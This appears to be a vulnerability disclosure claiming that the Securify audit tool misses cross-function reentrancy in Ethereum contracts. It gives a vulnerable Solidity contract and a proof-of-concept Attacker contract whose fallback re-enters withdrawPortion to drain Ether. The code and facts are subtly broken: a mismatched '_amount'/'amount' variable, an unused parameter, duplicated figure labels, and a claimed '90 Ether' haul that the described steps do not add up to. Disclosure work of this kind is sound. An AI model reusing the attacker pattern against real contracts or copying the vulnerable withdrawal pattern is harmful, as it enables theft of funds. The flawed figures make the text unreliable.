# Cross-function reentrancy

## Vendor
Securify

## Vulnerability Type
Reentrancy

## Abstract
We found a vulnerability in Ethereum smart contracts, where an attacker can undesirably re-enter the contract to steal money. 
This vulnerability can bypass "Securify", which is a smart contract audit tool. This tool fails to capture the attacks across different functions.
Therefore, it allows attackers to re-enter a contract and steal money. The vulnerability can be abstracted as: (1) given a contract `Vulnerable` containing two transfer functions `withdrawPortion` and `withdrawAll`, which can transfer Ether to another contract. 
(2) Once the function `withdrawAll` of contract `Vulnerable` is called to withdraw Ether to a contract `Attacker`, the `fallback` function of `Attacker` is automatically invoked. 
(3) In the `fallback` function, contract `Attacker` calls function `withdrawPortion`, which will undesirably transfer money to `Attacker` again. 


## Details

"Securify" is a Ethereum smart contract audit tool, which has a large group of users. You can use "Securify" to check if a smart contract has vulnerabilities.

<div align=center><img width="520" height="240" src="./images/securify.png"/></div>
<div align=center>Figure 2: Securify: smart contract aduit tool</div>

We found the vulnerability which can be ragarded as cross-function reentrancy.

<div align=center><img width="520" height="240" src="./images/cross-function.png"/></div>
<div align=center>Figure 2: A specific instance of cross-function reentrancy</div>

Contract `Vulnerable` contains two transfer functions `withdrawAll` and `withdrawPortion`, both of the two functions can send Ether to another contract address.
* `withdrawAll` declares a transfer operation, which allows a recipient to withdraw all his/her money.
* `withdrawPortion` declares another transfer operation, which allows a recipient to withdraw part of his/her money.
```
contract Vulnerable{
  ...
  
  // withdraw all the money
  function withdrawAll(address to) external {
      uint256 amount = userBalances[msg.sender];
      if (userBalances[msg.sender] > 0) {
        require(msg.sender.call.value(amount)());
    	  userBalances[msg.sender] = 0;
      }
  }
  
  // withdraw part of the money
  function withdrawPortion(uint _amount) external {   
     if (userBalances[msg.sender] >= amount) {
        require(msg.sender.call.value(amount)());
        userBalances[msg.sender] -= amount;
     }
  }
}
```

## Exploit
The attacker can withdraw 10 Ether from contract `Vulnerable` by calling the function `withdrawAll` of contract `Vulnerable`. 
Then, the attacker utilizes the `fallback` function to call the function `withdrawPortion` of `Vulnerable` 9 times. 
In total, the attacker may withdraw 90 Ether, which is much more than expected.

```
contract Attacker{
  ...
  
  function attack(){
    vul.withdrawAll(_owner);
  }

  function () payable{ // fallback function
     count++;
     if(count < 10){
       vul.withdrawPortion(1 ether);
     }
  }
}
```

**Analysis** `userBalances[msg.sender]` is the critical variable as it records the amount of Ether that the caller holds in the contract. 
After the transfer operation `require(msg.sender.call.value(amount)());` (line 6 in Figure 1 left) of function `withdrawAll` is executed, the `fallback` function of contract `Attacker` will be triggered before the `userBalances[msg.sender]` is updated, 
thus making the contract `Vulnerable` believe that the attacker still has enough Ether in the contract. Then, the `fallback` function of contract `Attacker` calls the function `withdrawPortion` of `Vulnerable` recurrently until the `count` reaches 10. `if (count < 10) { vul.withdrawPortion(1 Ether); }`. 


## Conclusion
Overall, we would like to highlight that this cross-function reentrancy is common in Ethereum smart contracts while "Securify" cannot capture them. 
Attackers can make use of two transfer functions of the vulnerable contract and the `fallback` mechanism to re-enter the vulnerable contract to steal money. 
Solidity developers should carefully audit their code whether they use bad cross transfer functions.

## Reference
Official Website
https://securify.chainsecurity.com/

Github
https://github.com/eth-sri/securify

contract code
https://github.com/Messi-Q/SmartContracts/blob/master/Cross-function-reentrancy.sol
